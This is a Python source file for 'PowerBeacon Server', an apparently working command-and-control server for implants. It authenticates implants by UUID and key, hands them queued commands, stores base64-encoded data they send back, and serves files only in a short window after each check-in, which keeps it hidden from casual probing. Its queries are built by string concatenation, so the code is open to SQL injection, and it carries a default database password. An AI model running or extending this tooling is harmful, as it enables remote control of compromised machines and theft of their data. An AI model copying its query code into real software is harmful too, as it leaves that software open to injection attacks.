#!/usr/bin/python3
"""
PowerBeacon Server
This script implements a simple HTTP server with GET and POST request handling, 
integrated with a MySQL database for storing and retrieving data. It supports 
optional SSL for secure communication.
Classes:
    MySQLConnection: Context manager for MySQL database connections.
    HandleRequests: Handles HTTP GET and POST requests.
Functions:
    unset_should_get: Controls whether GET requests will be answered.
Usage:
    Run the script with the required arguments:
    -p : Port number (required)
    -b : Host address (optional)
    --ssl : Enable SSL (optional, set to "true" to enable)
Example:
    python powerbeaconServer.py -p 8080 --ssl true
Modules:
    os, time, ssl, ast, base64, threading, argparse, datetime, http.server, MySQLdb
Global Variables:
    should_get: Controls whether the server is active.
    stop_threads: Stops the thread resetting should_get.
"""
import os
import time
import ssl
import ast
import base64
import threading
import argparse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
import MySQLdb

should_get=False             #controls whether thge server is active
stop_threads=False           #stop the thread resetting should_get

#Create MySQLConnection Context Manager
class MySQLConnection:
    def __init__(self, connection_settings):
        self.connection_settings = connection_settings
    def __enter__(self):
        self.connection = MySQLdb.connect(**self.connection_settings)
        return self.connection
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.connection.close()

#Configure DB Connection
connection_settings = {
    'host': os.getenv('DB_HOST', 'localhost'),
    'user': os.getenv('DB_USER', 'root'),
    'passwd': os.getenv('DB_PASSWD', 't00r'),
    'db': os.getenv('DB_NAME', 'powerbeacon')
}

def writeLog(log_type, log_text, implant_name, UUID):
    """
    Writes a log entry to the database.
    Args:
        log_type (str): Type/category of the log.
        log(str): Log message/content.
        name (str): Name of the implant.
        UUID (str): UUID of the implant.
    """
    with MySQLConnection(connection_settings) as connection:
        cursor = connection.cursor()
        query = (
            "INSERT INTO logs (log_type, log, name, UUID) "
            "VALUES (%s, %s, %s, %s)"
        )
        cursor.execute(query, (log_type, log_text, implant_name, UUID))
        connection.commit()


#####controls whether GET will be answered.  Is OFF except for 5 seconds after auth
def unset_should_get():
    global should_get
    global stop_threads
    while True:
        if stop_threads:
            break
        if should_get:
            time.sleep(5)
        should_get=False
        time.sleep(5)

class HandleRequests(BaseHTTPRequestHandler):
    def log_message(self,format, *args):
        pass

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):   #Get Function
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"

        path=os.getcwd()
        req = self.path
        self.path=path + "/web_serve/"+self.path  #path to serve from
        IP=self.client_address[0]
        try:
            global should_get
            if should_get:
                self._set_headers()
                with open(self.path, 'rb') as f:
                    data = f.read()  #read file
                    f.close()
                self.wfile.write(data)
                print(green+"[+]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[200 OK]"+default)  #write to console that it was read
                writeLog("Success", f"Served file {req} to IP: {IP}", "NULL","NULL")
        except:
            with open(path+"/web_serve/404.html", 'rb') as f:  #otherwise return a 404
                data = f.read()
                f.close()
            self.wfile.write(data)
            print(yellow+"[!]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[400 NOT FOUND]"+default)  #and log the 404 to console
            writeLog("Warning", f"File not found {req} to IP: {IP}", "NULL","NULL")

    def do_POST(self):
        global should_get
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"
        
        #dicto = {}
        #line_check = {}
        send_task = ''
        #reads post request body

        self._set_headers()
        try:
            # Read the contents and convert to a dictionary format we can use
            content_len = int(self.headers['Content-Length'])
            post_body = self.rfile.read(content_len)
            post_body = post_body.decode("utf-8")
            new_obj = ast.literal_eval(post_body)
            IP = self.client_address[0]
        except:
            IP = self.client_address[0]
            date_time = datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
            print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
            return 0

        # Pull vars from dict
        with MySQLConnection(connection_settings) as connection:
            connection.commit()
            event=new_obj["event"]
            if event=="validate":
                try:
                    name=new_obj["name"]
                    key=new_obj["key"]
                    query = f"select verify_key from callbackAddresses where name='{name}'"
                    cursor=connection.cursor()
                    cursor.execute(query)
                    results=cursor.fetchall()
                    verify_key=results[0][0]
                    if verify_key==key:
                        self.wfile.write("write-host Connection Validated".encode("utf-8"))
                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                        print(f"{green}{date_time}[+]VALIDATE:::Incomming Validation from {IP}:::Server Connect Success{default}")
                        writeLog("Success", f"Server validation success from IP: {IP}", "NULL","NULL")
                        #connection.close()
                        return 0
                    else:
                        print(f"{red}{date_time}[-]VALIDATE:::Incomming Validation from {IP}:::Invalid Verification Key{default}")
                        writeLog("Error", f"Server validation failed from IP: {IP} - Invalid Key", "NULL","NULL")
                        return 0
                except:
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                    writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                    return 0
            
            try:
                UUID=new_obj["UUID"]
                key=new_obj["key"]
                request=new_obj["event"]
            except:
                IP = self.client_address[0]
                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                return 0

            cursor=connection.cursor()
            #check if implant exists
            query = "select * from implants where UUID='" + UUID +"'"
            cursor.execute(query)
            results=cursor.fetchall()
            if (len(results)<1):  #if it doesn't exist write implant not found and return
                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
                writeLog("Error", f"Request from unknown UUID: {UUID} at IP: {IP}", "name",UUID)
                #connection.close()
                return 0
            #Check if key matches    
            query = f"select * from implants where UUID='{UUID}' and implantkey='{key}'"
            cursor.execute(query)
            results=cursor.fetchall()
            query =f"select implant_name from implants where UUID='{UUID}'"
            cursor.execute(query)
            name_results=cursor.fetchall()
            implant_name=name_results[0][0]
            if (len(results) > 0):
                if (request=="req"):#only if requests
    #                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
                    cursor.execute("INSERT INTO checkins (UUID,gateway) VALUES ('" + UUID +"','" + IP + "')")
                    cursor.execute("commit")
                    should_get = True
                    query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks
                    cursor.execute(query)
                    results=cursor.fetchall() ###results are the tasks from the DB
                    
                    if (len(results) > 0):#if tasks are greater than none
                        date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
                        num_tasks=len(results)
                        task_word = "Task" if num_tasks == 1 else "Tasks"
                        print(green+date_time+"[+]Incomming Request from " + implant_name + " at IP: " + IP + " :::" + str(num_tasks) + " " + task_word + " delivered"+default)
                        writeLog("Success", f"Check-in from {implant_name} at IP: {IP} - {num_tasks} {task_word} delivered", implant_name,UUID)
                        send_task=''
                        
                        for result in results:
                            send_task=send_task+str(result[0])+";"  #concat all tasks with a ";" between
                        self.wfile.write(send_task.encode("utf-8"))
                        ##and update the tasks so they are marked complete in the DB
                        query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
                        cursor.execute(query)
                        connection.commit()
                        #connection.close()
                        return 0
                    else: #if no tasks
                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                        print(f"{date_time}[-]Incomming Request from {implant_name} at IP: {IP} :::No Tasking Available")
                        writeLog("Log", f"Check-in from {implant_name} at IP: {IP} - No tasks available", implant_name,UUID)
                        #connection.close()
                        return 0  #end of if for requests
                elif (request=="send"): #post data to server
                    try:
                        data=new_obj["data"]
                        details=new_obj["details"]
                        data=base64.b64decode(data).decode('UTF-16LE')

                        query="INSERT INTO datastore (UUID,data,details) VALUES ('" + UUID + "','" + data +"','" + details +"')"
                        cursor.execute(query)
                        query="commit"
                        cursor.execute(query)
                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                        print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
                        writeLog("Data", f"Data received from {implant_name} at IP: {IP}", implant_name,UUID)
                        #connection.close()
                        return 0
                    except:
                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                        print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                        writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                        #connection.close()
                        return 0
                        

                else: #request type is bad
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                    writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                    #connection.close()
                    return 0
                    

            else: ###if key doesnt match
                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
                writeLog("Error", f"Request from {implant_name} at IP: {IP} - Invalid Key", implant_name,UUID)
                #connection.close()
                return 0
    def do_PUT(self):
        self.do_POST()

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, required=True)
    parser.add_argument('-b', type=str, required=False)
    parser.add_argument('--ssl',type=str, required=False)
    args = parser.parse_args()
    
    if args.b:
        host = args.b
    else:
        host = ''
    port = args.p
    
    reset=threading.Thread(target=unset_should_get, args=())
    reset.start()
    if args.ssl=="true":
        try:
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(certfile="/tmp/cert.pem", keyfile="/tmp/key.pem")
            ssl_server = HTTPServer((host, port), HandleRequests)
            ssl_server.socket = ssl_context.wrap_socket(ssl_server.socket, server_side=True)  # wrap with SSL
            print("[+]Starting POWERBEACON Server using SSL on port " + str(port))
            ssl_server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*]Shutting down server")
            stop_threads = True
    else:
        try:
            print("[+]Starting POWERBEACON Server on port "+ str(port))
            HTTPServer((host, port),HandleRequests).serve_forever()
        except KeyboardInterrupt:
            print("\n[*]Shutting down server")
            stop_threads=True
    
